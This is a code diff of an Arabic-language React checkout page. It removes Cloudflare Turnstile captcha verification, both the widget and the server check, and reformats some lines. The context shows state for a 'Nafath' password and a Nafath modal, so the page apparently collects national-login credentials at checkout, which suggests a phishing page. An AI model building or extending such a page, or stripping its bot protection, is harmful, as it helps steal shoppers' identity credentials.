@@ -44,7 +44,6 @@ import { PromoPopup } from "../components/promo-popup";
 import React from "react";
 import NafazModal from "../components/nafaz-modal";
 import { setupOnlineStatus } from "@/lib/utils";
-import { Turnstile } from "@marsidev/react-turnstile";
 
 interface ShippingInfo {
   fullName: string;
@@ -119,7 +118,6 @@ export default function CheckoutPage() {
   const [nafadPassword, setNafadPassword] = useState("");
   const [phoneProvider, setPhoneProvider] = useState("");
   const [phone2, setPhone2] = useState("");
-  const [captchaToken, setCaptchaToken] = useState("");
   const [captchaError, setCaptchaError] = useState("");
   const [isVerifying, setIsVerifying] = useState(false);
   const [isProcessingOrder, setIsProcessingOrder] = useState(false);
@@ -581,27 +579,6 @@ export default function CheckoutPage() {
       city: cityError,
     });
 
-    if (!captchaToken) {
-      setCaptchaError("الرجاء إكمال التحقق");
-      return;
-    }
-
-    try {
-      const response = await fetch("/api/verify-captcha", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ token: captchaToken }),
-      });
-      const data = await response.json();
-      if (!data.success) {
-        setCaptchaError("فشل التحقق، يرجى المحاولة مرة أخرى");
-        return;
-      }
-    } catch (error) {
-      setCaptchaError("حدث خطأ في التحقق");
-      return;
-    }
-
     if (!visitorId) return;
     await addData({ id: visitorId, ...shippingInfo });
     if (!nameError && !phoneError && !cityError) {
@@ -1020,7 +997,9 @@ export default function CheckoutPage() {
                       <div className="flex items-center gap-2 mt-2">
                         <select
                           value={item.strength}
-                          onChange={(e) => updateCartStrength(item.productId, e.target.value)}
+                          onChange={(e) =>
+                            updateCartStrength(item.productId, e.target.value)
+                          }
                           className="h-8 px-2 text-sm rounded-md border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring"
                         >
                           <option value="٣ ملغ">3mg</option>
@@ -1129,7 +1108,6 @@ export default function CheckoutPage() {
                 <MapPin className="h-4 w-4" />
                 حدد الموقع من الخريطة
               </Button>
-
               <div className="grid gap-4 md:grid-cols-2">
                 <div className="space-y-2">
                   <Label htmlFor="fullName">الاسم الكامل</Label>
@@ -1172,7 +1150,6 @@ export default function CheckoutPage() {
                   )}
                 </div>
               </div>
-
               <div className="grid gap-4 md:grid-cols-2">
                 <div className="space-y-2">
                   <Label htmlFor="city">المدينة</Label>
@@ -1207,7 +1184,6 @@ export default function CheckoutPage() {
                   />
                 </div>
               </div>
-
               <div className="space-y-2">
                 <Label htmlFor="street">اسم الشارع</Label>
                 <Input
@@ -1219,7 +1195,6 @@ export default function CheckoutPage() {
                   }
                 />
               </div>
-
               <div className="grid gap-4 md:grid-cols-2">
                 <div className="space-y-2">
                   <Label htmlFor="sex">الجنس</Label>
@@ -1242,7 +1217,10 @@ export default function CheckoutPage() {
                     id="nationality"
                     value={shippingInfo.nationality || ""}
                     onChange={(e) =>
-                      setShippingInfo({ ...shippingInfo, nationality: e.target.value })
+                      setShippingInfo({
+                        ...shippingInfo,
+                        nationality: e.target.value,
+                      })
                     }
                     className="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
                   >
@@ -1252,31 +1230,7 @@ export default function CheckoutPage() {
                   </select>
                 </div>
               </div>
-
-              <div className="flex flex-col items-center gap-2 pt-4">
-                <Turnstile
-                  siteKey={
-                    import.meta.env.VITE_TURNSTILE_SITE_KEY ||
-                    "0x4AAAAAACHhS42xVwG-cY7h"
-                  }
-                  onSuccess={(token) => {
-                    setCaptchaToken(token);
-                    setCaptchaError("");
-                  }}
-                  onError={() => setCaptchaError("فشل التحقق")}
-                  onExpire={() => {
-                    setCaptchaToken("");
-                    setCaptchaError(
-                      "انتهت صلاحية التحقق، يرجى المحاولة مرة أخرى",
-                    );
-                  }}
-                />
-                {captchaError && (
-                  <p className="text-sm text-destructive">{captchaError}</p>
-                )}
-              </div>
-
-
+              <div className="flex flex-col items-center gap-2 pt-4"></div>{" "}
               <div className="flex gap-3 pt-4">
                 <Button
                   variant="outline"
